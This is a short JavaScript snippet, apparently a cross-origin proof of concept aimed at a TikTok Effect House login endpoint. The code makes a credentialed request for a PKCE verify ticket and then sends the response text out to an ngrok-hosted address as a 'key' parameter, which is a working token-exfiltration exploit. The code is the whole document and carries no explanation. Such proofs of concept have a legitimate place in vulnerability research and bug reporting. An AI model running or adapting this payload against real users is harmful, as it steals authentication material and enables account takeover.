var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "https://effecthouse.tiktok.com/passport/web/gen_pkce_verify_ticket/?aid=1459&code_challenge=472c93bxxxxxxxxxxxxxxxxf&language=en");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//b564-202-162-37-174.ngrok-free/?key='+this.responseText; 
};
